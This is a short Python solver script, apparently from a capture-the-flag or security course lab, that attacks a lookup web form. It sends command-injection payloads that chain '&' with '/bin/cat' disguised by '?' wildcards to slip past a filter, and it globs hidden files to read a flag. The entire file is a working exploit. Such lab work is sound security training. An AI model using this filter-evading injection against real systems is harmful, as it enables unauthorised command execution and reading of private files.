import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

class Solver:
    def __init__(self):
        self.session = get_session()

    def replace_with_wildcards(self, path: str) -> str:
        return ''.join('?' if char != '/' else char for char in path)

    def main(self):
        URL = "https://lookup.quoccacorp.com"
        CAT_PATH = "/bin/cat"

        for i in range(3):
            payload = f"[] & {self.replace_with_wildcards(CAT_PATH)} {"/*" * i + "/.*"}"
            response = self.session.post(URL, data={"query": payload})
            find_flag(response.text)

if __name__ == "__main__":
    Solver().main()